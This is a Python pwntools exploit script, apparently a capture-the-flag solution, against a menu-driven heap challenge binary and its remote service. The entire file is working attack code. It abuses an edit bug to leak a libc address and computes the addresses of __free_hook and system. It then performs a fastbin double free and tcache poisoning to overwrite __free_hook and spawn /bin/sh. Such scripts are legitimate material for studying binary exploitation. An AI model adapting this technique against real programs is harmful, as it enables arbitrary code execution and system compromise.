#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep

context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./heap_chal"
libc = ELF("./libc.so.6")
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("heap-challenge.cpctf.space", 30018)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
		c
        loadsym
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)

def new(index, msg_len, content):
    p.recvuntil("> ")
    p.sendline("1")
    p.recvuntil("index> ")
    p.sendline(str(index))
    p.recvuntil("msg_len> ")
    p.sendline(str(msg_len))
    p.recvuntil("content> ")
    p.sendline(content)

def edit(index, msg_len, content):
    p.recvuntil("> ")
    p.sendline("2")
    p.recvuntil("index> ")
    p.sendline(str(index))
    p.recvuntil("new_len> ")
    p.sendline(str(msg_len))
    p.recvuntil("new_content> ")
    p.sendline(content)

def super_edit(index):
    p.recvuntil("> ")
    p.sendline("2")
    p.recvuntil("index> ")
    p.sendline(str(index))
    p.recvuntil("new_len> ")
    p.sendline(str(-1))

def show(index):
    p.recvuntil("> ")
    p.sendline("3")
    p.recvuntil("index> ")
    p.sendline(str(index))
    return p.recvline().rstrip(b'\n')

def delete(index):
    p.recvuntil("> ")
    p.sendline("4")
    p.recvuntil("index> ")
    p.sendline(str(index))

# leak libc address
new(0, 0x10, b"TCACHE01")
new(1, 0x500, b"UNSORTED")
new(2, 0x10, b"TCACHE03")
new(3, 0x10, b"TCACHE05")
new(4, 0x10, b"TCACHE07")
new(5, 0x10, b'W_FREE')
super_edit(1)
leak = u64(show(1) + b"\00\00")
log.info("leak: " + hex(leak))
libc_base = leak - 0x60 - 0x1ecb80
log.info("libc_base: " + hex(libc_base))
free_hook_addr = libc.symbols['__free_hook'] + libc_base
log.info("__free_hook: " + hex(free_hook_addr))
libc_system_addr = libc.symbols['system'] + libc_base
log.info("system@libc: " + hex(libc_system_addr))

# overwrite __free_hook
## fill tcache (size = 0x20)
## size of metadata chunk = 0x20
## So, we can free 6 chunks just by delete * 3
delete(0)
delete(2)
delete(3)
super_edit(4)
delete(5)# double free @ fastbin
super_edit(5)
new(0, 0x10, b'A' * 4)
new(2, 0x10, b'B' * 4)
new(3, 0x10, b'C' * 4)
new(4, 0x10, p64(free_hook_addr))
super_edit(0)
new(3, 0x10, b'/bin/sh')
new(6, 0x10, p64(libc_system_addr))
delete(3)


p.interactive()
